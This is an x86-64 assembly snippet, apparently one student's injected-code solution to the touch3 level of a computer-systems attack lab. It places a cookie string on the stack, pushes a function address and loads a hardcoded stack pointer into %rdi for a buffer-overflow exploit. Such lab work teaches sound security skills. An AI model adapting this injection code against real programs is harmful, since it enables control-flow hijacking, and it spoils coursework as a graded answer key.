# pushq $0x59b997fa #save cookie in stack
# 35 39 62 39 39 37 66 61
movl $0x39623935, (%rsp)
movl $0x61663739, 0x4(%rsp)
movq $0x00, 0x8(%rsp)
pushq $0x4018fa #address of touch3
movq $0x5561dca8, %rdi #save the address of cookie in %rdi
retq
